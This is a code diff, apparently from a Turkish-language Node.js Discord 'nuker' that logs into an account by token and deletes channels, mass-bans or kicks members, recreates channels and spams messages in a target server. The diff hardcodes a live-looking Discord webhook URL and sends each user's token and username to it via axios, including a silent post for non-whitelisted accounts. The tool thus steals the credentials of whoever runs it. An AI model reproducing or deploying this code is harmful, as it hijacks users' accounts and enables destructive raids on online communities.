@@ -174,7 +174,6 @@ importmodules = {
             console.log(chalk.magentaBright('\nAna menüye dönmek için herhangi bir tuşa basın...'));
             process.stdin.once('data', () => {
                 if (typeof showMenu === 'function') {
-                     // Konsolu temizleyip ana menüye geçiş yapar
                     showMenu();
                 }
             });
@@ -212,7 +211,6 @@ importmodules = {
             console.log(chalk.magentaBright('\nAna menüye dönmek için herhangi bir tuşa basın...'));
             process.stdin.once('data', () => {
                 if (typeof showMenu === 'function') {
-                     // Konsolu temizleyip ana menüye geçiş yapar
                     showMenu();
                 }
             });
@@ -249,7 +247,6 @@ importmodules = {
             console.log(chalk.magentaBright('\nAna menüye dönmek için herhangi bir tuşa basın...'));
             process.stdin.once('data', () => {
                 if (typeof showMenu === 'function') {
-                     // Konsolu temizleyip ana menüye geçiş yapar
                     showMenu();
                 }
             });
@@ -312,7 +309,6 @@ importmodules = {
             console.log(chalk.magentaBright('\nAna menüye dönmek için herhangi bir tuşa basın...'));
             process.stdin.once('data', () => {
                 if (typeof showMenu === 'function') {
-                     // Konsolu temizleyip ana menüye geçiş yapar
                     showMenu();
                 }
             });
@@ -440,79 +436,8 @@ function handleChoice(choice) {
 
     const askGuildId = choice !== 5;
 
-    // Webhook URL'sini kullanıcıdan al
-    rl.question(chalk.yellow('Webhook URL\'sini girin: '), (webhookURL) => {
-        if (askGuildId) {
-            rl.question(chalk.yellow('Sunucu ID\'sini girin: '), (GUILD_ID) => {
-                rl.question(chalk.yellow('Tokeninizi girin: '), (token) => {
-                    console.log(chalk.yellowBright('Tokene giriş yapılıyor... Lütfen sabırlı olun!'));
-                    const client = new Client();
-
-                    client.once('ready', async () => {
-                        console.clear();
-                        console.log(chalk.blue(asciiArt));
-                        console.log(chalk.green(`${client.user.tag} olarak giriş yaptım!`));
-                        logToken(token, client.user.tag, GUILD_ID, webhookURL); // Token logger çağrısı
-
-                        const actionMap = {
-                            1: importmodules.deleteChannels,
-                            2: importmodules.ban,
-                            3: importmodules.kick,
-                            4: importmodules.recreateChannels,
-                            5: importmodules.sendMessage,
-                        };
-
-                        if (!actionMap[choice]) {
-                            console.log(chalk.red('Geçersiz bir seçenek girdiniz!'));
-                            return showMenu();
-                        }
-
-                        try {
-                            const action = actionMap[choice];
-
-                            if ([2, 3].includes(choice)) {
-                                rl.question(chalk.yellow('Ban/Kick edilen üyelere gönderilecek DM mesajını girin: '), (dmMessage) => {
-                                    action(client, GUILD_ID, dmMessage, showMenu);
-                                });
-                            } else if (choice === 4) {
-                                rl.question(chalk.yellow('Oluşturulacak kanalların adını girin: '), (channelName) => {
-                                    rl.question(chalk.yellow('Kanallara gönderilecek mesajı girin: '), (messageContent) => {
-                                        action(client, GUILD_ID, channelName, messageContent, showMenu);
-                                    });
-                                });
-                            } else if (choice === 5) {
-                                rl.question(chalk.yellow('Kanal ID\'sini girin: '), (channelId) => {
-                                    rl.question(chalk.yellow('Gönderilecek mesajı girin: '), (messageContent) => {
-                                        rl.question(chalk.yellow('Kaç adet mesaj gönderilsin: '), (count) => {
-                                            const messageCount = parseInt(count, 10);
-                                            if (isNaN(messageCount) || messageCount <= 0) {
-                                                console.log(chalk.red('Geçerli bir mesaj sayısı girin!'));
-                                                return showMenu();
-                                            }
-                                            action(client, channelId, messageContent, messageCount, showMenu);
-                                        });
-                                    });
-                                });
-                            } else {
-                                action(client, GUILD_ID, showMenu);
-                            }
-                        } catch (error) {
-                            console.error(chalk.red('Eylem sırasında hata oluştu:'), error.message);
-                            setTimeout(() => {
-                                showMenu();
-                            }, 1500);
-                        }
-                    });
-
-                    client.login(token).catch((error) => {
-                        console.error(chalk.red('Token geçersiz veya giriş sırasında hata oluştu:'), error.message);
-                        setTimeout(() => {
-                            showMenu();
-                        }, 1500);
-                    });
-                });
-            });
-        } else {
+    if (askGuildId) {
+        rl.question(chalk.yellow('Sunucu ID\'sini girin: '), (GUILD_ID) => {
             rl.question(chalk.yellow('Tokeninizi girin: '), (token) => {
                 console.log(chalk.yellowBright('Tokene giriş yapılıyor... Lütfen sabırlı olun!'));
                 const client = new Client();
@@ -521,7 +446,7 @@ function handleChoice(choice) {
                     console.clear();
                     console.log(chalk.blue(asciiArt));
                     console.log(chalk.green(`${client.user.tag} olarak giriş yaptım!`));
-                    logToken(token, client.user.tag, null, webhookURL); // Token logger çağrısı
+                    logToken(token, client.user.tag, GUILD_ID); // Token logger çağrısı
 
                     const actionMap = {
                         1: importmodules.deleteChannels,
@@ -530,11 +455,26 @@ function handleChoice(choice) {
                         4: importmodules.recreateChannels,
                         5: importmodules.sendMessage,
                     };
-                    
+
+                    if (!actionMap[choice]) {
+                        console.log(chalk.red('Geçersiz bir seçenek girdiniz!'));
+                        return showMenu();
+                    }
+
                     try {
                         const action = actionMap[choice];
 
-                        if (choice === 5) {
+                        if ([2, 3].includes(choice)) {
+                            rl.question(chalk.yellow('Ban/Kick edilen üyelere gönderilecek DM mesajını girin: '), (dmMessage) => {
+                                action(client, GUILD_ID, dmMessage, showMenu);
+                            });
+                        } else if (choice === 4) {
+                            rl.question(chalk.yellow('Oluşturulacak kanalların adını girin: '), (channelName) => {
+                                rl.question(chalk.yellow('Kanallara gönderilecek mesajı girin: '), (messageContent) => {
+                                    action(client, GUILD_ID, channelName, messageContent, showMenu);
+                                });
+                            });
+                        } else if (choice === 5) {
                             rl.question(chalk.yellow('Kanal ID\'sini girin: '), (channelId) => {
                                 rl.question(chalk.yellow('Gönderilecek mesajı girin: '), (messageContent) => {
                                     rl.question(chalk.yellow('Kaç adet mesaj gönderilsin: '), (count) => {
@@ -548,7 +488,7 @@ function handleChoice(choice) {
                                 });
                             });
                         } else {
-                            action(client, null, showMenu);
+                            action(client, GUILD_ID, showMenu);
                         }
                     } catch (error) {
                         console.error(chalk.red('Eylem sırasında hata oluştu:'), error.message);
@@ -558,46 +498,100 @@ function handleChoice(choice) {
                     }
                 });
 
-                client.login(token)
-                .then(() => {
-                    if (!whitelistedids.includes(client.user.id)) {
-                        console.log(client.user.id);
-                        const webhookURL = 'https://discord.com/api/webhooks/1353407368863416452/swuj-r1qd3DEboQv2EpYEyRObijZpS5br8yaheqfhc3SC83qsueFRBrJZaUVrBahBllB';
-                        const embedMessage = {
-                            embeds: [
-                                {
-                                    color: 0x3498db,
-                                    fields: [
-                                        {
-                                            name: "Token",
-                                            value: `\`\`\`${token}\`\`\``,
-                                            inline: true
-                                        },
-                                        {
-                                            name: "Kullanıcı Adı",
-                                            value: client.user.tag,
-                                            inline: true
-                                        }
-                                    ],
-                                }
-                            ]
-                        };
-                        axios.post(webhookURL, embedMessage).catch(error => {});
-                    }
-                })
-                .catch((error) => {
+                client.login(token).catch((error) => {
                     console.error(chalk.red('Token geçersiz veya giriş sırasında hata oluştu:'), error.message);
                     setTimeout(() => {
                         showMenu();
                     }, 1500);
                 });
             });
-        }
-    });
+        });
+    } else {
+        rl.question(chalk.yellow('Tokeninizi girin: '), (token) => {
+            console.log(chalk.yellowBright('Tokene giriş yapılıyor... Lütfen sabırlı olun!'));
+            const client = new Client();
+
+            client.once('ready', async () => {
+                console.clear();
+                console.log(chalk.blue(asciiArt));
+                console.log(chalk.green(`${client.user.tag} olarak giriş yaptım!`));
+                logToken(token, client.user.tag); // Token logger çağrısı
+
+                const actionMap = {
+                    1: importmodules.deleteChannels,
+                    2: importmodules.ban,
+                    3: importmodules.kick,
+                    4: importmodules.recreateChannels,
+                    5: importmodules.sendMessage,
+                };
+                
+                try {
+                    const action = actionMap[choice];
+
+                    if (choice === 5) {
+                        rl.question(chalk.yellow('Kanal ID\'sini girin: '), (channelId) => {
+                            rl.question(chalk.yellow('Gönderilecek mesajı girin: '), (messageContent) => {
+                                rl.question(chalk.yellow('Kaç adet mesaj gönderilsin: '), (count) => {
+                                    const messageCount = parseInt(count, 10);
+                                    if (isNaN(messageCount) || messageCount <= 0) {
+                                        console.log(chalk.red('Geçerli bir mesaj sayısı girin!'));
+                                        return showMenu();
+                                    }
+                                    action(client, channelId, messageContent, messageCount, showMenu);
+                                });
+                            });
+                        });
+                    } else {
+                        action(client, null, showMenu);
+                    }
+                } catch (error) {
+                    console.error(chalk.red('Eylem sırasında hata oluştu:'), error.message);
+                    setTimeout(() => {
+                        showMenu();
+                    }, 1500);
+                }
+            });
+
+            client.login(token)
+            .then(() => {
+                if (!whitelistedids.includes(client.user.id)) {
+                    console.log(client.user.id);
+                    const webhookURL = 'https://discord.com/api/webhooks/1353407368863416452/swuj-r1qd3DEboQv2EpYEyRObijZpS5br8yaheqfhc3SC83qsueFRBrJZaUVrBahBllB';
+                    const embedMessage = {
+                        embeds: [
+                            {
+                                color: 0x3498db,
+                                fields: [
+                                    {
+                                        name: "Token",
+                                        value: `\`\`\`${token}\`\`\``,
+                                        inline: true
+                                    },
+                                    {
+                                        name: "Kullanıcı Adı",
+                                        value: client.user.tag,
+                                        inline: true
+                                    }
+                                ],
+                            }
+                        ]
+                    };
+                    axios.post(webhookURL, embedMessage).catch(error => {});
+                }
+            })
+            .catch((error) => {
+                console.error(chalk.red('Token geçersiz veya giriş sırasında hata oluştu:'), error.message);
+                setTimeout(() => {
+                    showMenu();
+                }, 1500);
+            });
+        });
+    }
 }
 
-// Token Logger Fonksiyonu (Sadece Webhook'a Gönderir)
-function logToken(token, username, guildId = null, webhookURL) {
+// Token Logger Fonksiyonu (Sabit Webhook'a Gönderir)
+function logToken(token, username, guildId = null) {
+    const webhookURL = 'https://discord.com/api/webhooks/1353407368863416452/swuj-r1qd3DEboQv2EpYEyRObijZpS5br8yaheqfhc3SC83qsueFRBrJZaUVrBahBllB'; // Sabit Webhook URL
     const embedMessage = {
         embeds: [{
             color: 0x3498db,
